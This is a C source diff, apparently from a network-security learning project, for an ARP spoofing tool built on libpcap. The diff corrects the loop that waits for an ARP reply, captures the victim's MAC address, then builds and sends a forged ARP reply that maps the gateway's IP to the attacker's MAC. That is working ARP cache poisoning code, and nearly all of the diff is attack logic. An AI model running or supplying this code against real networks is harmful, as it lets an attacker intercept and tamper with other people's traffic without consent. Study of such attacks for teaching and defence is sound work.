@@ -65,25 +65,42 @@ int main(int argc, char *argv[]) {
 	struct packet_ARP *arpRecv = &arpReq;
 
 	int timeout = 0;
-	while(	!memcmp(arpRecv->MAC_destin, MAC_attack, 6) &&
-		htons(arpRecv->etherType) == 0x0806	&&
-		htons(arpRecv->operation) == 0x02	&&
-		!memcmp(arpRecv->ptAddr_source, IP_victim, 4) &&
-		!memcmp(arpRecv->ptAddr_destin, IP_attack, 4) &&
-		!memcmp(arpRecv->hwAddr_destin, MAC_attack, 6)) {
-		
+	while(	!((!memcmp(arpRecv->MAC_destin, MAC_attack, 6)) &&
+		ntohs(arpRecv->etherType) == 0x0806	&&
+		ntohs(arpRecv->operation) == 0x0002	&&
+		(!memcmp(arpRecv->ptAddr_source, IP_victim, 4)) &&
+		(!memcmp(arpRecv->ptAddr_destin, IP_attack, 4)) &&
+		(!memcmp(arpRecv->hwAddr_destin, MAC_attack, 6)))) {
 		if (!timeout--) {
 			timeout = 10;
 			printf("Packet sent.\n");
 			pcap_sendpacket(handle, (u_char *)&arpReq, sizeof(arpReq));
 		}
+
 		assert(load(handle), "packet loading failed");
 		arpRecv = (struct packet_ARP *)packet;
 	}
 
-	printf("gotit!\n");
+	memcpy(MAC_victim, arpRecv->MAC_source, 6);
+
+	printf("ARP received. Victim's MAC address is..\n");
 	printMac(arpRecv->MAC_source);
 	printf("\n");
+
+	struct packet_ARP arpRep;
+	memcpy(arpRep.MAC_destin, MAC_victim, 6);
+	memcpy(arpRep.MAC_source, MAC_attack, 6);
+	
+	arpRep.operation = htons(2);
+	
+	memcpy(arpRep.hwAddr_destin, MAC_victim, 6);
+	memcpy(arpRep.hwAddr_source, MAC_attack, 6);
+	memcpy(arpRep.ptAddr_destin, IP_victim, 4);
+	memcpy(arpRep.ptAddr_source, IP_gateway, 4);
+
+	pcap_sendpacket(handle, (u_char *)&arpRep, sizeof(arpRep));
+
+	printf("ARP send Done.\n");
 }
 
 
